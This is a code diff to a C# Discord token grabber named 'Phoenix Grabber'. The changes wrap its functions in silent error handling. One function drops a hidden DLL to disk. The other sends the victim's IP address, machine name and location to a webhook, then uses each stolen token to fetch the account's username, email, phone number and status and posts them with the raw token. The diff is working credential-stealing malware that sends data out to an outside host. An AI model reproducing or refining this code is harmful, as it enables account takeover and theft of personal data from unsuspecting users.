@@ -38,20 +38,16 @@ namespace Program
         #region BouncyCastle
         static void BouncyCastle()
         {
-            if (!File.Exists("BouncyCastle.Crypto.dll"))
+            try
             {
-                Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("BouncyCastle.Crypto.dll");
-                BinaryReader br = new BinaryReader(stream);
-                FileStream fs = new FileStream("BouncyCastle.Crypto.dll", FileMode.Create);
-                BinaryWriter bw = new BinaryWriter(fs);
-                byte[] ba = new byte[stream.Length];
-                stream.Read(ba, 0, ba.Length);
-                bw.Write(ba);
-                br.Close();
-                bw.Close();
-                stream.Close();
-                File.SetAttributes("BouncyCastle.Crypto.dll", File.GetAttributes("BouncyCastle.Crypto.dll") | FileAttributes.Hidden);
+                if (!File.Exists("BouncyCastle.Crypto.dll"))
+                {
+                    using (var resource = Assembly.GetExecutingAssembly().GetManifestResourceStream("BouncyCastle.Crypto.dll"))
+                    using (var file = new FileStream("BouncyCastle.Crypto.dll", FileMode.Create, FileAccess.Write)) { resource.CopyTo(file); }
+                    File.SetAttributes("BouncyCastle.Crypto.dll", File.GetAttributes("BouncyCastle.Crypto.dll") | FileAttributes.Hidden);
+                }
             }
+            catch { }
         }
         #endregion
 
@@ -129,35 +125,39 @@ namespace Program
         #region Send Info
         static void SendInfo()
         {
-            Request("//Webhook", "POST", null, "{\"embeds\":[{\"footer\":{\"text\":\"Phoenix Grabber | " + DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss") + "\"},\"author\":{\"name\":\"Phoenix Grabber\",\"url\":\"https://github.com/extatent\"},\"fields\":[{\"name\":\"IP Address\",\"value\":\"" + IP() + "\"},{\"name\":\"Computer Name\",\"value\":\"" + Environment.MachineName + "\"},{\"name\":\"Location\",\"value\":\"" + Location() + "\"}]}],\"content\":\"\",\"username\":\"Phoenix Grabber\"}");
-            if (tokens.Count != 0)
+            try
             {
-                foreach (string token in tokens)
+                Request("//Webhook", "POST", null, "{\"embeds\":[{\"footer\":{\"text\":\"Phoenix Grabber | " + DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss") + "\"},\"author\":{\"name\":\"Phoenix Grabber\",\"url\":\"https://github.com/extatent\"},\"fields\":[{\"name\":\"IP Address\",\"value\":\"" + IP() + "\"},{\"name\":\"Computer Name\",\"value\":\"" + Environment.MachineName + "\"},{\"name\":\"Location\",\"value\":\"" + Location() + "\"}]}],\"content\":\"\",\"username\":\"Phoenix Grabber\"}");
+                if (tokens.Count != 0)
                 {
-                    var request = Request("/users/@me", "GET", token);
-                    dynamic info = new JavaScriptSerializer().DeserializeObject(request);
-                    var id = info["id"];
-                    if (string.IsNullOrEmpty(id))
-                        id = "N/A";
-                    var username = info["username"] + "#" + info["discriminator"];
-                    if (string.IsNullOrEmpty(username))
-                        username = "N/A";
-                    var email = info["email"];
-                    if (string.IsNullOrEmpty(email))
-                        email = "N/A";
-                    var phone = info["phone"];
-                    if (string.IsNullOrEmpty(phone))
-                        phone = "N/A";
-                    var request2 = Request("/users/@me/settings", "GET", token);
-                    dynamic info2 = new JavaScriptSerializer().DeserializeObject(request2);
-                    var status = info2["status"];
-                    if (string.IsNullOrEmpty(status))
-                        status = "N/A";
-                    var creationdate = DateTimeOffset.FromUnixTimeMilliseconds((Convert.ToInt64(id) >> 22) + 1420070400000).DateTime.ToString();
-                    Request("//Webhook", "POST", null, "{\"embeds\":[{\"footer\":{\"text\":\"Phoenix Grabber | github.com/extatent\"},\"author\":{\"name\":\"Phoenix Grabber\",\"url\":\"https://github.com/extatent\"},\"fields\":[{\"name\":\"Username\",\"value\":\"" + username + "\"},{\"name\":\"ID\",\"value\":\"" + id + "\"},{\"name\":\"Email\",\"value\":\"" + email + "\"},{\"name\":\"Phone Number\",\"value\":\"" + phone + "\"},{\"name\":\"Status\",\"value\":\"" + status + "\"},{\"name\":\"Creation Date\",\"value\":\"" + creationdate + "\"},{\"name\":\"Token\",\"value\":\"" + token + "\"}]}],\"content\":\"\",\"username\":\"Phoenix Grabber\"}");
-                    Thread.Sleep(200);
+                    foreach (string token in tokens)
+                    {
+                        var request = Request("/users/@me", "GET", token);
+                        dynamic info = new JavaScriptSerializer().DeserializeObject(request);
+                        var id = info["id"];
+                        if (string.IsNullOrEmpty(id))
+                            id = "N/A";
+                        var username = info["username"] + "#" + info["discriminator"];
+                        if (string.IsNullOrEmpty(username))
+                            username = "N/A";
+                        var email = info["email"];
+                        if (string.IsNullOrEmpty(email))
+                            email = "N/A";
+                        var phone = info["phone"];
+                        if (string.IsNullOrEmpty(phone))
+                            phone = "N/A";
+                        var request2 = Request("/users/@me/settings", "GET", token);
+                        dynamic info2 = new JavaScriptSerializer().DeserializeObject(request2);
+                        var status = info2["status"];
+                        if (string.IsNullOrEmpty(status))
+                            status = "N/A";
+                        var creationdate = DateTimeOffset.FromUnixTimeMilliseconds((Convert.ToInt64(id) >> 22) + 1420070400000).DateTime.ToString();
+                        Request("//Webhook", "POST", null, "{\"embeds\":[{\"footer\":{\"text\":\"Phoenix Grabber | github.com/extatent\"},\"author\":{\"name\":\"Phoenix Grabber\",\"url\":\"https://github.com/extatent\"},\"fields\":[{\"name\":\"Username\",\"value\":\"" + username + "\"},{\"name\":\"ID\",\"value\":\"" + id + "\"},{\"name\":\"Email\",\"value\":\"" + email + "\"},{\"name\":\"Phone Number\",\"value\":\"" + phone + "\"},{\"name\":\"Status\",\"value\":\"" + status + "\"},{\"name\":\"Creation Date\",\"value\":\"" + creationdate + "\"},{\"name\":\"Token\",\"value\":\"" + token + "\"}]}],\"content\":\"\",\"username\":\"Phoenix Grabber\"}");
+                        Thread.Sleep(200);
+                    }
                 }
             }
+            catch { }
         }
         #endregion
 
